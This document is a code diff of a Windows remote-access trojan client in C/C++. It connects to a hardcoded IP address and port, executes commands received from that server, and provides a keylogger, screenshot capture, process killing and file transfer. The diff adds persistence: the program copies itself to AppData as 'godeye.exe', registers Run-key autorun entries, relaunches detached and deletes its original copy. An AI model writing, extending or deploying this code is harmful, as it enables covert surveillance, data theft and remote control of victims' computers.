@@ -1,3 +1,6 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define _CRT_SECURE_NO_DEPRECATE
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
@@ -21,8 +24,12 @@
 #include <winnt.h>
 #include <versionhelpers.h>
 #include <winbase.h>
-#include <unistd.h>
 #include <thread>
+#include <initguid.h>
+#include <KnownFolders.h>
+#include <shlobj.h>
+#include <wchar.h>
+#include <comdef.h>
 
 using namespace Gdiplus;
 using namespace std;
@@ -32,8 +39,9 @@ using namespace std;
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "kernel32.lib")
+#pragma comment(lib, "Ucrt.lib")
 
-#define BUFFER_SIZE 8096
+#define BUFFER_SIZE 1024
 #define TRUE 1
 
 SOCKET initSocket(const char* SERVER_IP, int PORT) {
@@ -82,7 +90,7 @@ void recvData(SOCKET clientSocket, char* buff)
 	recv(clientSocket, buff, BUFFER_SIZE, 0);
 }
 
-//----------------------------------------------------------------HELPER 
+//----------------------------------------------------------------HELPER----------------------------------------------------------------
 void redirectHelper(SOCKET clientSocket)
 {
 	const char* buff;
@@ -115,13 +123,13 @@ void CMDHelper(SOCKET clientSocket)
 	sendData(clientSocket, buff);
 }
 
-//---------------------------------------------------------------- CMD WORKER 
+//---------------------------------------------------------------- CMD WORKER----------------------------------------------------------------
 void handleCommand(SOCKET clientSocket) {
     char buffer[BUFFER_SIZE] = {0};
 
 	while (1) {
         memset(buffer, 0, sizeof(buffer));
-        ssize_t bytes_received = recv(clientSocket, buffer, sizeof(buffer), 0);
+        size_t bytes_received = recv(clientSocket, buffer, sizeof(buffer), 0);
         if (bytes_received <= 0) {
             break;
         }
@@ -130,58 +138,30 @@ void handleCommand(SOCKET clientSocket) {
 	 		break;
 		}	
         if (strlen(buffer) > 0) {
-			if (strncmp(buffer, "cd ", 3) == 0) {
-        		// Extract the directory from the buffer
-				char dir[PATH_MAX];
-				if (sscanf(buffer + 3, "%s", dir) != 1) {
-					perror("Invalid directory format");
-					exit(1);
-				}
-
-				// Change directory for the program
-				if (chdir(dir) == -1) {
-					perror("Directory change failed");
-					exit(1);
-				}
-
-				char cwd[PATH_MAX];
-				if (getcwd(cwd, sizeof(cwd)) == NULL) {
-					perror("getcwd error");
-					exit(1);
-				}
-
-				char response[PATH_MAX + 64];
-				snprintf(response, sizeof(response), "Current Directory: %s $", cwd);
-				send(clientSocket, response, strlen(response), 0);
+			FILE *cmd_output = _popen(buffer, "r");
+			if (cmd_output == NULL) {
+				perror("Command execution error");
+				exit(1);
 			}
-			else{
-				FILE *cmd_output = popen(buffer, "r");
-				if (cmd_output == NULL) {
-					perror("Command execution error");
-					exit(1);
-				}
 
-				char output_str[1024];
-				memset(output_str, 0, sizeof(output_str));
-				fread(output_str, 1, sizeof(output_str) - 1, cmd_output);
-				//pclose(cmd_output);
+			char output_str[1024];
+			memset(output_str, 0, sizeof(output_str));
+			fread(output_str, 1, sizeof(output_str) - 1, cmd_output);
+			//pclose(cmd_output);
 
-				char cwd[PATH_MAX];
-				if (getcwd(cwd, sizeof(cwd)) == NULL) {
-					perror("getcwd error");
-					exit(1);
-				}
+			WCHAR cwd[MAX_PATH];
+			GetModuleFileNameW(NULL, cwd, MAX_PATH);
 
-				char response[BUFFER_SIZE + PATH_MAX];
-				snprintf(response, sizeof(response), "%s\nCurrent Directory: %s $", output_str, cwd);
-				send(clientSocket, response, strlen(response), 0);
-			}
+			char response[BUFFER_SIZE + MAX_PATH];
+			snprintf(response, sizeof(response), "%s\nCurrent Directory: %ls $", output_str, cwd);
+			send(clientSocket, response, strlen(response), 0);
+			
 		}
 	}
 }
 
 
-//---------------------------------------------------------------- SCREENSHOT
+//---------------------------------------------------------------- SCREENSHOT----------------------------------------------------------------
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 {
 	UINT  num = 0;          // number of image encoders
@@ -246,7 +226,7 @@ void SCREENSHOTWorker(SOCKET clientSocket, char* pathSave)
 
 }
 
-//----------------------------------------------------------------KEYLOGGER
+//----------------------------------------------------------------KEYLOGGER----------------------------------------------------------------
 #include "keylogger.h"
 
 
@@ -372,7 +352,7 @@ void Keylogger::logger(char* filePath)
 	}
 }
 
-//----------------------------------------------------------------LIST RUNNING PROCESS
+//----------------------------------------------------------------LIST RUNNING PROCESS----------------------------------------------------------------
 void listProcesses(char* buffer, size_t buffer_size) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
@@ -401,7 +381,7 @@ void listProcesses(char* buffer, size_t buffer_size) {
     CloseHandle(snapshot);
 }
 
-//----------------------------------------------------------------KILL A PROCESS
+//----------------------------------------------------------------KILL A PROCESS----------------------------------------------------------------
 void killProcess(SOCKET clientSocket) {
 	char buff [BUFFER_SIZE];
 	if (recv(clientSocket, buff, BUFFER_SIZE, 0)){
@@ -425,7 +405,7 @@ void killProcess(SOCKET clientSocket) {
 	}
 }
 
-//----------------------------------------------------------------FILE DOWNLOAD FROM CLIENT TO SERVER
+//----------------------------------------------------------------FILE DOWNLOAD FROM CLIENT TO SERVER----------------------------------------------------------------
 void sendFile(SOCKET clientSocket){
 	char filePath[BUFFER_SIZE];
 	recvData(clientSocket, filePath);
@@ -465,7 +445,7 @@ void sendFile(SOCKET clientSocket){
     sendData(clientSocket, "File transfer complete!");
 }
 
-//---------------------------------------------------------------- FILE UPLOAD FROM SERVER TO CLIENT
+//---------------------------------------------------------------- FILE UPLOAD FROM SERVER TO CLIENT----------------------------------------------------------------
 void receiveFile(SOCKET clientSocket) {
 	// receive file path to save in client
 	char filePath[BUFFER_SIZE];
@@ -502,7 +482,7 @@ void receiveFile(SOCKET clientSocket) {
     sendData(clientSocket, "File received successfully.");
 }
 
-//----------------------------------------------------------------INFO
+//----------------------------------------------------------------INFO----------------------------------------------------------------
 void getVersionInfo(char* buff)
 {
 	OSVERSIONINFOEXA versionInfo;
@@ -581,11 +561,11 @@ void getMemoryStatus(char* buff)
 	sprintf(buff, "\nPercentage of physical memory that is in use: %d", memoryStatus.dwMemoryLoad);
 
 	strcat(buff, "\nAmount of actual physical memory, in bytes: ");
-	sprintf(temp, "%d", memoryStatus.dwTotalPhys);
+	sprintf(temp, "%d", (int)memoryStatus.dwTotalPhys);
 	strcat(buff, temp);
 
 	strcat(buff, "\nAmount of physical memory currently available, in bytes: ");
-	sprintf(temp, "%d", memoryStatus.dwAvailPhys);
+	sprintf(temp, "%d", (int)memoryStatus.dwAvailPhys);
 	strcat(buff, temp);
 }
 
@@ -640,7 +620,7 @@ void infoComputer(SOCKET sock)
 	sendData(sock, buff);
 }
 
-//----------------------------------------------------------------COMPUTER POWER 
+//----------------------------------------------------------------COMPUTER POWER----------------------------------------------------------------
 int powerComputer(SOCKET sock)
 {
 	HANDLE hProcess, hToken;
@@ -680,7 +660,7 @@ int powerComputer(SOCKET sock)
 	return 0;
 }
 
-//----------------------------------------------------------------ADD CLIENT.EXE TO REGISTRY AUTORUN 
+//----------------------------------------------------------------ADD TO REGISTRY AUTORUN----------------------------------------------------------------
 BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName){
     HKEY hKey = NULL;
     LONG lResult = 0;
@@ -751,21 +731,127 @@ BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR arg
 
     return fSuccess;
 }
-
-void RegisterProgram(){
-    wchar_t szPathToExe[MAX_PATH] = L"C:\\Users\\new\\Desktop\\client.exe";
-
-    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
-    RegisterMyProgramForStartup(L"MyClient", szPathToExe, L"-foobar");
+void registerClient(){
+	WCHAR clientPath[MAX_PATH];
+	GetModuleFileNameW(NULL, clientPath, MAX_PATH);
+	RegisterMyProgramForStartup(L"MyClient", clientPath, L"-foobar");
 }
 
-int clientStartup(){
-    RegisterProgram();
-    IsMyProgramRegisteredForStartup(L"MyClient");
+void registerGodeye(){
+	char *appDataPath = getenv("localappdata");
+    char *nameApp = (char*)"\\godeye.exe";
+    
+    char *concatenated = (char *)malloc(strlen(appDataPath) + strlen(nameApp) + 1);
+    if (concatenated != NULL) {
+		wchar_t appDataPathConverted[MAX_PATH];
+        strcpy(concatenated, appDataPath);
+        strcat(concatenated, nameApp);
+		swprintf(appDataPathConverted, MAX_PATH, L"%hs", concatenated);
+    	RegisterMyProgramForStartup(L"MyGodeye", appDataPathConverted, L"-foobar");
+    } 
+	else {
+        printf("Environment variable 'APPDATA' not found.\n");
+    }
+}
+
+int addRegistry(){
+	registerClient();
+    registerGodeye();
+	IsMyProgramRegisteredForStartup(L"MyClient");
+    IsMyProgramRegisteredForStartup(L"MyGodeye");
     return 0;
 }
 
-//----------------------------------------------------------------REDIRECT
+//----------------------------------------------------------------GET CLIENT PATH IN REGISTRY----------------------------------------------------------------
+void removeSuffix(char *str, const char *suffix) {
+    size_t str_len = strlen(str);
+    size_t suffix_len = strlen(suffix);
+
+    if (str_len >= suffix_len && strcmp(str + str_len - suffix_len, suffix) == 0) {
+        str[str_len - suffix_len] = '\0';
+    }
+}
+
+void removeQuotes(char *str) {
+    size_t len = strlen(str);
+
+    if (len >= 2 && str[0] == '"' && str[len - 1] == '"') {
+        memmove(str, str + 1, len - 2);
+        str[len - 2] = '\0';
+    }
+}
+
+void delKeyRegistry(LPCWSTR valueName){
+	HKEY hKey;
+    LPCWSTR keyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+    RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey);
+    RegDeleteValueW(hKey, valueName);
+}
+
+void getClientPathAndDelete(LPCWSTR valueName){
+	//get path
+	HKEY hKey;
+    LPCWSTR keyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    WCHAR valueData[512];
+    DWORD valueDataSize = sizeof(valueData);
+
+	if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
+        // Retrieve the value data
+        if (RegGetValueW(hKey, NULL, valueName, RRF_RT_REG_SZ, NULL, valueData, &valueDataSize) == ERROR_SUCCESS) {
+        } else {
+            wprintf(L"Failed to retrieve value data.\n");
+        }
+    } else {
+        wprintf(L"Failed to open registry key.\n");
+    }
+
+	char path[MAX_PATH];
+	wcstombs(path, valueData, MAX_PATH);
+	const char suffix[] = " -foobar";
+	removeSuffix(path, suffix);
+	removeQuotes(path);
+	
+	//delete client and client key in registry
+	delKeyRegistry(valueName);
+	remove(path);
+}
+
+//----------------------------------------------------------------AUTO COPY CLIENT TO GODEYE, EXECUTE THEN EXIT----------------------------------------------------------------
+void autoCopyAndStart(){
+	//copy client.exe to godeye.exe
+	WCHAR appDataPathW[MAX_PATH];
+	//get path AppData/Local
+    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPathW);
+    wcscat_s(appDataPathW, MAX_PATH, L"\\godeye.exe");
+	WCHAR sourcePathW[MAX_PATH];
+    GetModuleFileNameW(NULL, sourcePathW, MAX_PATH);
+	//copy 
+    if (CopyFileW(sourcePathW, appDataPathW, FALSE)) {
+        wprintf(L"Copied program to AppData folder: %ls\n", appDataPathW);
+    } else {
+        wprintf(L"Failed to copy program\n");
+    }
+	//add to registry
+	addRegistry();
+	//start program after copy
+	HANDLE hProcess = NULL;
+	HANDLE hThread = NULL;
+	STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (CreateProcessW(appDataPathW, NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
+		CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+		wprintf(L"Fail to run child process!");
+    }
+}
+
+
+//----------------------------------------------------------------REDIRECT----------------------------------------------------------------
 void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot, char* pathSaveKeyLogger)
 {
 	char buff[BUFFER_SIZE] = { 0 };
@@ -795,7 +881,6 @@ void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot, char* pathSaveKe
 			if (send(clientSocket, buffer, strlen(buffer), 0) < 0) {
 				perror("Sending data failed");
     		}
-            sendData(clientSocket, "List running processes successfully!");
 		}
 		else if (!strcmp(buff, "KPC")){
 			killProcess(clientSocket);
@@ -817,7 +902,9 @@ void redirectCmd(SOCKET clientSocket, char* pathSaveScreenshot, char* pathSaveKe
         else if (!strcmp(buff, "INFO")){
             infoComputer(clientSocket);
         }
-
+		else {
+			perror("Wrong command, please try again");
+		}
 		memset(buff, 0, BUFFER_SIZE);
 	}
 }
@@ -828,14 +915,24 @@ int main(){
     char HOST[] = "18.167.99.46", pathSaveScreenshot[] = "C:\\screenshot.png", pathSaveKeyLogger[] = "C:\\keylogger.txt";
     int PORT = 8008;
 	while (true){
+
+		//check program running is client or godeye
+		WCHAR selfPathWCHAR[MAX_PATH];
+		GetModuleFileNameW(NULL, selfPathWCHAR, MAX_PATH);
+		char narrowModuleFileName[MAX_PATH];
+		wcstombs(narrowModuleFileName, selfPathWCHAR, MAX_PATH);
+		const char* name = strrchr(narrowModuleFileName, '\\') + 1;
+
+		if (!strcmp(name, "client.exe")) {
+			autoCopyAndStart();
+			exit(0);
+		}
+
+		getClientPathAndDelete(L"MyClient");
 		SOCKET clientSocket;
     	clientSocket = initSocket(HOST, PORT);
-
-		clientStartup();
-
 		if (clientSocket == INVALID_SOCKET) {
 			printf("Failed to initialize the socket.\n");
-			Sleep(5000);
 			continue;
 		}
 
